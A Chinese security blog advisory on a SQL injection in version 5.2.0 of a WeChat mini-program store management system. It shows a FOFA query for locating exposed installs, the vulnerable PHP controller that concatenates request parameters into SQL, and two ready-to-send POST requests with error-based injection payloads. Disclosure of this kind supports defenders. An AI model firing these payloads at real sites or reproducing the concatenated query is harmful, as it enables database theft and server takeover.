---
title: "万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagemycoupon-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/17 18:32
- 543浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

软件

数据库

小程序

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPagemycoupon 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
public function doPagemycoupon()
    {
        $uniacid = input('uniacid');
        $suid = input('suid');
        $flag = input('flag');
        $tiaojian = " and flag <> 2 and flag = 0";
        if ($flag == 0) {
            $tiaojian = " and flag <> 2 and flag = 0";
        }
        if ($flag == 1) {
            $tiaojian = " ";
        }

        //if ($suid) {
        //$user = Db::name('wd_xcx_user')->where("uniacid", $uniacid)->where("openid", $openid)->find();
        //}
        //$suid = $user['id'];
        $prefix = config('database.prefix');
        $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
        $time = time();
        $aa = [];
        foreach ($yhqsold as $key => &$resi) {
            if ($resi['etime'] != 0) {
                if ($time > $resi['etime'] && $resi['flag'] == 0) {
                    $kdata = array(
                        "flag" => 2
                    );
                    Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                }
            }
        }
        // 重新获取过滤后的我的优惠券
        $prefix = config('database.prefix');
        $yhqs = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY flag asc, id desc");
        $type = input("type");

        foreach ($yhqs as $key => &$res) {
```

两处 Db::query sql语句里的 `$uniacid` 和 `$suid` 均来自用户可控的参数，因此造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPagemycoupon HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--&suid=1
```

[![万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞](images/img-001-248682277542.webp)](https://image.mrxn.net/ac5f41d739f24c0eb63d4f50fd627a7a.webp)

```
POST /api/wxapps/doPagemycoupon HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+1=1&uniacid=1
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
